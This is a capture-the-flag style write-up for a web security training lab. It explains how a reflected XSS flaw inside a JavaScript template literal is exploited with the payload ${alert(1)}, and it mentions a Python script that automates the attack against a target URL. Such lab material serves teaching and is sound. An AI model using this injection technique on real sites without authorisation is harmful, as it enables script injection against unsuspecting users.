# XSS LAB 21 - Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

## Manual Solution

### 1. Access the Lab.
- Open the Web Security Academy lab environment in your browser.

### 2. Analyze the Vulnerability
- Perform a search with the following query: `' " / \ < >`
- Review the page source and locate the relavent script.
```js
<script>
    var message = `0 search results for '\u0027 \u0022 / \u005c \u003c \u003e'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```
- As seen in the script:
    - `'`,`"`,`\`,`< >` are Unicode-escaped.
    - Used a backtick (`) in the script allowing us to use a template literal.

### 3. Inject the XSS payload
- Perform a search with the following query: `${alert(1)}`
- With this query, the script becomes:
```js
    var message = `0 search results for '${alert(1)}'`;
    document.getElementById('searchMessage').innerText = message;
```
- The alert function is executed because the `${alert(1)}` inside the template literal triggers it
- You can gain more information from `https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Template_literals`


## Automated Solution

### 1. Download the script
### 2. Run the script with the following command:
```sh
python xss_lab_21.py -u <target_url> -p (if you want to use proxy 127.0.0.1:8080)
```